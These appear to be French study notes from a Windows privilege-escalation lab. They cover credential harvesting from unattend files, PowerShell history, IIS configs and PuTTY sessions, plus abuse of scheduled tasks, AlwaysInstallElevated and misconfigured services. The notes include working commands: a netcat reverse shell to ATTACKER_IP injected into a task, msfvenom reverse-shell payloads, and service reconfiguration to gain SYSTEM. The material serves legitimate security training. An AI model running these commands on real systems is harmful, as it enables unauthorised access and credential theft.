## Introduction

Contexte : accès initial avec utilisateur non-privilégié sur Windows -> objectif : escalader vers un compte administrateur.

---

## Windows Privilege Escalation

Utiliser un accès "user A" pour obtenir un accès "user B" en exploitant une faiblesse du système.

Vecteurs courants :

- Mauvaises configurations de services ou tâches planifiées
- Privilèges excessifs sur le compte courant
- Logiciels vulnérables
- Patches Windows manquants

### Windows Users

|Type|Description|
|---|---|
|Administrators|Contrôle total : configs système + tous les fichiers|
|Standard Users|Accès limité, pas de modifications système permanentes|
|SYSTEM / LocalSystem|Compte OS interne, privilèges supérieurs aux admins|
|Local Service|Exécute des services Windows avec privilèges minimaux, connexions réseau anonymes|
|Network Service|Exécute des services Windows avec privilèges minimaux, s'authentifie via credentials machine|

`SYSTEM` > `Administrators` > `Standard Users`

Les comptes spéciaux (SYSTEM, Local Service, Network Service) ne sont pas utilisables directement, mais peuvent être obtenus en exploitant certains services.

---

## Harvesting Passwords from Usual Spots

### Unattended Windows Installations

Fichiers à vérifier :

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

Chercher des blocs `<Credentials>` contenant username/password en clair.

### Powershell History

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

-> Depuis `cmd.exe`. Remplacer `%userprofile%` par `$Env:userprofile` si depuis PowerShell.

### Saved Windows Credentials

```cmd
cmdkey /list
runas /savecred /user:admin cmd.exe
```

-> `cmdkey /list` ne montre pas les mots de passe, mais permet d'identifier des creds réutilisables avec `runas /savecred`.

### IIS Configuration

Fichiers à vérifier :

```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### Retrieve Credentials from Software: PuTTY

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

-> Récupère les credentials proxy stockés en clair (ProxyPassword + ProxyUsername).

Même logique applicable à : browsers, email clients, FTP/SSH/VNC clients.

---

## Other Quick Wins

### Scheduled Tasks

```cmd
schtasks /query /tn vulntask /fo list /v
```

Vérifier : `Task To Run` (binaire exécuté) + `Run As User` (contexte d'exécution).

```cmd
icacls c:\tasks\schtask.bat
```

Si `BUILTIN\Users:(F)` -> modification possible -> injecter un payload :

```cmd
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
schtasks /run /tn vulntask
```

```bash
nc -lvp 4444
```

### AlwaysInstallElevated

> Non exploitable sur cette room - informatif uniquement.

Les `.msi` peuvent être configurés pour s'exécuter en admin peu importe l'utilisateur.

Vérifier les deux clés registre (les deux doivent être définies) :

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Si les deux sont set :

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

```cmd
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

---

## Abusing Service Misconfigurations

### Windows Services

```cmd
sc qc <service>
```

Clés importantes : `BINARY_PATH_NAME` (exécutable) + `SERVICE_START_NAME` (compte d'exécution).

Config stockée dans : `HKLM\SYSTEM\CurrentControlSet\Services\`

> Dans PowerShell, `sc` est un alias de `Set-Content` -> utiliser `sc.exe`

### Insecure Permissions on Service Executable

```cmd
sc qc WindowsScheduler
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```

Si `Everyone:(M)` -> remplacer l'exécutable par un payload :

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
python3 -m http.server
```

```cmd
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
move WService.exe WService.exe.bkp
move rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F
sc stop windowsscheduler
sc start windowsscheduler
```

### Unquoted Service Paths

Si `BINARY_PATH_NAME` contient des espaces et n'est pas entre guillemets, le SCM teste les chemins dans l'ordre :

```
C:\MyPrograms\Disk.exe                          <- testé en 1er
C:\MyPrograms\Disk Sorter.exe                   <- testé en 2nd
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe  <- binaire légitime
```

Condition : avoir les droits d'écriture sur un des dossiers parents (`icacls` -> chercher `AD`/`WD` sur `BUILTIN\Users`).

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
nc -lvp 4446
```

```cmd
move rev-svc2.exe C:\MyPrograms\Disk.exe
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```

### Insecure Service Permissions

Le DACL du service lui-même (pas son exécutable) peut permettre de reconfigurer le service.

```cmd
accesschk64.exe -qlc thmservice
```

Si `BUILTIN\Users: SERVICE_ALL_ACCESS` -> modifier la config du service :

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
nc -lvp 4447
```

```cmd
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
sc stop THMService
sc start THMService
```

-> Shell en `NT AUTHORITY\SYSTEM`

---

